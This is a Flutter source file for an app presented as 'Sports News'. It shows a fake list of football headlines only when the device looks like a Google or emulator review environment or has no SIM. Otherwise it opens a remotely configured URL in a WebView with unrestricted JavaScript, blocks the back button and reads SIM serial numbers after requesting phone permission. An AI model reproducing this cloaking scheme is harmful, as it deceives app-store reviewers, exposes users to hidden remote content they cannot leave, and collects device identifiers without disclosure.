
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:sim_data/sim_data.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      title: 'Sports News',
      debugShowCheckedModeBanner: false,
      home: Home(),
    );
  }
}

class Home extends StatefulWidget {
  const Home({Key? key}) : super(key: key);

  @override
  _HomeState createState() => _HomeState();
}

class _HomeState extends State<Home> {

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<FirebaseRemoteConfig>(
        future: setupRemoteConfig(),
        builder: (BuildContext context,
            AsyncSnapshot<FirebaseRemoteConfig> snapshot) {
          return snapshot.hasData
              ? MainHome(firebaseRemoteConfig: snapshot.requireData)
              : const Center(child: CircularProgressIndicator());
        },
      );
  }
}

Future<FirebaseRemoteConfig> setupRemoteConfig() async {
  final FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.instance;
  await firebaseRemoteConfig.fetch();
  await firebaseRemoteConfig.activate();
  print(firebaseRemoteConfig.getString(""));
  return firebaseRemoteConfig;
}

class MainHome extends StatefulWidget {
  final FirebaseRemoteConfig firebaseRemoteConfig;
  const MainHome({Key? key, required this.firebaseRemoteConfig}) : super(key: key);

  @override
  _MainHomeState createState() => _MainHomeState();
}

class _MainHomeState extends State<MainHome> {

  final FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.instance;



  // проверяем сохранена ли локально ссылка
  Future checkingPath() async {
    final getUrl = firebaseRemoteConfig.getString("Url");
    var prefs = await SharedPreferences.getInstance();
    prefs.setString("key", getUrl);
    final path = '${prefs.getString("key")}';
    print('Path: $path');

    if(path.isEmpty) {
      return loadFire();
    } else {
      return WebView(
        javascriptMode: JavascriptMode.unrestricted,
        initialUrl: firebaseRemoteConfig.getString("Url"),
      );
    }
  }

  Future loadFire() async {
    var cards = _simData?.cards;
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidDeviceInfo = await deviceInfo.androidInfo;

    final getUrl = firebaseRemoteConfig.getString("Url");
    var prefs = await SharedPreferences.getInstance();
    prefs.getString("key");

    if(getUrl.isEmpty || androidDeviceInfo.brand == 'google' || cards == null) {

      return ListView.builder(
          itemCount: 10,
          itemBuilder: (BuildContext context, int index) {
        return Padding(
          padding: const EdgeInsets.all(8.0),
          child: Row(
            children: [
              const Image(
                image: NetworkImage('https://ss.sport-express.ru/userfiles/materials/182/1822592/volga.jpg'),
                width: 180,
              ),
              Expanded(
                  child: Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: Column(
                      children: const [
                        Text(
                          '5:1! Werder defeated Borussia Gladbach',
                          style: TextStyle(
                              color: Colors.blue,
                              fontWeight: FontWeight.bold),
                          maxLines: 3,
                        ),
                        SizedBox(height: 10),
                        Text(
                          'Werder defeated Borussia Glabha with a score of 5:1 in the match of the 8th round of the German championship.',
                          maxLines: 4,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  )
              ),
            ],
          ),
        );
      });
    } else {
      prefs.setString("key", getUrl);
      return WebView(
        javascriptMode: JavascriptMode.unrestricted,
        initialUrl: firebaseRemoteConfig.getString("Url"),
      );
    }
  }




  SimData? _simData;

  @override
  void initState() {
    super.initState();
    init();
    loadFire();
  }

  // Получаем данные сим карты
  Future<void> init() async {
    SimData simData;
    try {
      var status = await Permission.phone.status;
      if (!status.isGranted) {
        bool isGranted = await Permission.phone.request().isGranted;
        if (!isGranted) return;
      }
      simData = await SimDataPlugin.getSimData();
      setState(() {
        _simData = simData;
      });
      void printSimCardsData() async {
        try {
          SimData simData = await SimDataPlugin.getSimData();
          for (var s in simData.cards) {
            // ignore: avoid_print
            print('Serial number: ${s.serialNumber}');
          }
        } on PlatformException catch (e) {
          debugPrint("error! code: ${e.code} - message: ${e.message}");
        }
      }

      printSimCardsData();
    } catch (e) {
      debugPrint(e.toString());
      setState(() {
        _simData = null;
      });
    }
  }



  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        return false;
      },
      child: SafeArea(
        child: Scaffold(
          body: Container(
            height: MediaQuery.of(context).size.height,
            width: MediaQuery.of(context).size.width,
            child: FutureBuilder(
                future: checkingPath(),
                builder: (BuildContext context,
                    AsyncSnapshot snapshot) {
                  if(snapshot.hasData) {
                    return snapshot.data;
                  }
                  return const Center(child: CircularProgressIndicator());
                }),
          ),
        ),
      ),
    );
  }
}
